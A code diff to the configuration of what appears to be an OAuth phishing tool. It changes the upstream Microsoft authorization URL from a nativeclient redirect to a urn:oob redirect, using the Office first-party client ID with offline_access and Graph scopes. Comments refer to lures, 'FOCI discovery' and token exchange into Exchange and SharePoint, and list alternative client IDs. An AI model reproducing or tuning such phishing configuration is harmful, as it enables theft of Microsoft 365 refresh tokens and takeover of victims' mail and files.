@@ -62,7 +62,11 @@ LURE_UUID = ""
 #
 # RECOMMENDED: Microsoft Office (FOCI) — broadest default consent, best for
 # FOCI discovery. Gets Graph + Exchange + SharePoint via token exchange.
-UPSTREAM_PATH = '/common/oauth2/v2.0/authorize?client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&redirect_uri=https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient&response_type=code&scope=openid+offline_access+https%3A%2F%2Fgraph.microsoft.com%2F.default'
+# If nativeclient redirect fails with AADSTS50011, use the urn:oob variant below.
+# UPSTREAM_PATH = '/common/oauth2/v2.0/authorize?client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&redirect_uri=https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient&response_type=code&scope=openid+offline_access+https%3A%2F%2Fgraph.microsoft.com%2F.default'
+#
+# Microsoft Office (FOCI) — urn:oob redirect (legacy fallback, widely accepted)
+UPSTREAM_PATH = '/common/oauth2/v2.0/authorize?client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&redirect_uri=urn%3Aietf%3Awg%3Aoauth%3A2.0%3Aoob&response_type=code&scope=openid+offline_access+https%3A%2F%2Fgraph.microsoft.com%2F.default'
 #
 # Azure PowerShell (FOCI) — Graph access, common for admin scenarios
 # UPSTREAM_PATH = '/common/oauth2/v2.0/authorize?client_id=1950a258-227b-4e31-a9cf-717495945fc2&redirect_uri=https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient&response_type=code&scope=openid+offline_access+https%3A%2F%2Fgraph.microsoft.com%2F.default'
